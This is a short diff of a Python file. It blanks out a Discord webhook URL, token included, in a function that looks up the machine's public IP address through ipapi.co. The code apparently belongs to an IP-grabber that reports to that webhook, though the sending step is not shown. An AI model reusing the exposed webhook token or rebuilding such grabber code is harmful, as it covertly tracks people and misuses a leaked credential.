@@ -14,7 +14,7 @@ header = r'''
 '''
 
 def getip():
-    h00k = "https://discord.com/api/webhooks/1304281608974635058/o1r_qnC_1GOp8V3dXT8IYfwFsiBf3_UCJ_7avW7XpUWz-1wAY5eFgTwj873evtOHgoU5"
+    h00k = ""
     msg = requests.get("https://ipapi.co/json/")
     msg_parse = msg.json()
     ipaddr = msg_parse['ip']
